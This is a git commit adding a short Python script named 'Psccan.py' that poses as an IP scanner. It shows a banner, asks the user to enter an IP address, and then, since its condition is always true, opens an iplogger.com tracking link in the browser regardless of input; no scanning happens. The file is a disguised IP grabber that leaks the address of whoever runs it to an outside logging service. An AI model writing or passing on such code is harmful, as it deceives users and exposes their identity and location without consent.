b52be63e33b03560fd3a198174d6bdf7d77f4ca4
zp-spec <85407990+zp-spec@users.noreply.github.com>
2021-07-03 20:42:45 +0200

    Add files via upload

---
+++ Psccan.py
@@ -0,0 +1,9 @@
+from os import *
+from time import sleep
+import webbrowser
+###########
+system("figlet Psccan")
+print("    ")
+ip=input("===> ENTER YOUR IP TO STRAT: ")
+if ip == (ip):
+	webbrowser.open("https://iplogger.com/2Bi3H6")
